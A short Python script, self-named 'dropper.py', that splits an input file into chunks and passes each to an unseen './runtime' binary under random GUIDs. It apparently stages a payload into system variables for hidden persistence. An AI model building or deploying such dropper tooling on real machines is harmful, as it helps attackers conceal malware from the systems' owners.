import sys
import os
import uuid

# usage: python3 dropper.py <filename>

MAXVARSIZE = 30000

def main():
    guids = []
    with open(sys.argv[1], "rb") as f:
        chunk = f.read(MAXVARSIZE)
        while chunk:
            with open("chunk", "wb") as f_:
                f_.write(chunk)
                guid = uuid.uuid4()
                guids.append(guid)
                os.system(f"./runtime {str(guid)} {str(guid).upper()} chunk")
            chunk = f.read(MAXVARSIZE)

    with open("guids", "w", encoding="utf-16-le") as f:
        for guid in guids:
            f.write(str(guid).upper())
        os.system(f"./runtime bfb35f7e-fc44-41ae-7cd9-68a80102b9d0 guids guids")


if __name__ == "__main__":
    main()
